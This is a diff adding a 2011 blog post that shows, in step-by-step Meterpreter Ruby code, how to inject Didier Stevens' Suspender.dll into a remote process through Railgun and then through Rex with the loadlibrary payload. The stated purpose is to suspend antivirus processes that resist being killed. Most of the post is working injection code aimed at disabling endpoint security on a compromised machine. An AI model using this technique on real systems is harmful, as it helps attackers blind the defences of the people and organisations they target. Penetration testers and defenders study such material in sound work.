@@ -1,0 +1,91 @@
+---
+author: mubix
+comments: true
+date: 2011-05-30 16:35:40+00:00
+layout: post
+title: Remote DLL Injection with Meterpreter
+categories:
+- dllinjection
+- metasploit
+- meterpreter
+- railgun
+---
+
+Recently Didier Stevens wrote 'Suspender.dll' which is a DLL that will suspend a process and all of it's child processes after a delay. 60 seconds is it's default but you can rename the DLL to add a number (as such 'Suspender10.dll' for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: [http://blog.didierstevens.com/2011/04/27/suspender-dll/](http://blog.didierstevens.com/2011/04/27/suspender-dll/)
+
+Jonathan Cran and I had the same idea, as I'm sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.
+
+I still stand by my original claim that just removing it is easier ([Blog Post: Silently Uninstall SEP](/blog/2010/11/16/silently-uninstall-sep)). However that might be something the user notices (A little shield disappearing).
+
+Well, I didn't know how to do this with meterpreter so a bit of google fu landed me on: [http://www.codeproject.com/KB/threads/winspy.aspx](http://www.codeproject.com/KB/threads/winspy.aspx) which has 3 different ways to attack the 2nd of which used a DLL (score!)
+
+Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)
+
+I start off setting up some variables after I've uploaded Suspender.dll:
+
+```ruby
+pid = 1436
+sizeofsuspend = 52376
+pathtosuspend = "C:\Docume~1\Administrator\Desktop\Suspender10.dll"
+```
+
+Next up we need to open a handle on the target process:
+
+```ruby
+handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)["return"]
+```
+
+With the handle we allocate some memory in the remote process for our DLL to live in:
+
+```ruby
+allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)["return"]
+```
+
+Writing that DLL to memory isn't much harder: (_**this and the previous step is the wrong way to do things as we'll see later**_)
+
+```ruby
+client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
+```
+
+Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn't figure this one out, here is the best I did:
+
+```ruby
+client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
+```
+
+Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:
+
+```ruby
+pid = 1436
+pathtosuspend = "C:\Docume~1\Administrator\Desktop\Suspender10.dll"
+```
+
+But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in [r12765](https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765). We generate the payload with it pointing at our Suspender DLL:
+
+```ruby     
+pay = client.framework.payloads.create("windows/loadlibrary")
+pay.datastore['DLL'] = pathtosuspend
+pay.datastore['EXITFUNC'] = 'thread'
+raw = pay.generate
+```
+
+Open the process, this time with Rex:
+
+```ruby
+targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+```
+
+Allocate the memory in the remote process write the payload (not our DLL) into that space:
+
+```ruby
+mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
+targetprocess.memory.write(mem, raw)
+```
+
+And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)
+
+```ruby
+targetprocess.thread.create(mem, 0)
+```
+
+And 10 seconds later our AV and all it's children processes stop. Suspended by Didier's Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.
